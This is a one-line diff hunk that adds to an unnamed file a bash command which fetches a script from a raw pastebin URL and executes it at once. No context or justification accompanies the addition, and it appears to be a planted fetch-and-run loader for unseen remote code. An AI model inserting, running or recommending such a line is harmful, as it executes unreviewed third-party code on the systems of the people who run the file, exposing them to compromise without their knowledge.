@@ -1,0 +1,1 @@
+bash <(curl -fsSL https://pastebin.com/raw/90cjvEut | sed 's/\r$//')
